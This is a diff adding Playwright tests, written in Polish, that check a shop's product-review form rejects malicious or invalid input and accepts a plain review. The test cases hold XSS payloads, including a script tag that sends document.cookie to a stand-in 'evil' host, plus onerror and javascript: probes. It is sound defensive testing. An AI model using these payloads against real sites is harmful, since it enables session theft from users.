@@ -66,6 +66,37 @@ test.describe('Badge Zweryfikowano zakupem', () => {
   });
 });
 
+test.describe('Walidacja treści opinii', () => {
+  const CASES = [
+    { name: 'za krótka treść', title: 'Krótko', comment: 'ok' },
+    { name: 'skrypt w treści', title: 'Normalny tytuł', comment: '<script>fetch("http://evil/"+document.cookie)</script> reszta treści opinii' },
+    { name: 'atrybut zdarzenia', title: 'Normalny tytuł', comment: '<img src=x onerror=alert(1)> treść uzupełniająca do dwudziestu znaków' },
+    { name: 'javascript: w tytule', title: 'javascript:alert(1)', comment: 'Zupełnie normalna treść opinii o produkcie.' },
+    { name: 'znacznik w tytule', title: '<b>pogrubione</b>', comment: 'Zupełnie normalna treść opinii o produkcie.' },
+  ];
+
+  for (const { name, title, comment } of CASES) {
+    test(`odrzuca opinię: ${name}`, async ({ page }) => {
+      await registerVerifiedCustomer(page, uniqueEmail('walidacja'));
+
+      await page.goto(`/sklep/produkty/${PRODUCT_SLUG}/recenzje/nowa`);
+      await page.fill('[name="sylius_shop_product_review[title]"]', title);
+      await page.fill('[name="sylius_shop_product_review[comment]"]', comment);
+      await page.locator('.sylius-rating label').nth(4).click();
+      await page.locator('button[type="submit"], input[type="submit"]').last().click();
+
+      await expect(page, 'formularz zostaje z błędem, opinia nie wchodzi').toHaveURL(/recenzje\/nowa/);
+      await expect(page.locator('.invalid-feedback').first()).toBeVisible();
+    });
+  }
+
+  test('przyjmuje zwykłą opinię tekstową', async ({ page }) => {
+    await registerVerifiedCustomer(page, uniqueEmail('walidacja-ok'));
+
+    await addReview(page, PRODUCT_SLUG, 'Swietny olejek', 'Zapach eukaliptusa utrzymuje sie dlugo, polecam na wieczor.');
+  });
+});
+
 function reviewCard(page: Page, title: string): Locator {
   return page.locator('div.border-bottom').filter({ hasText: title }).first();
 }
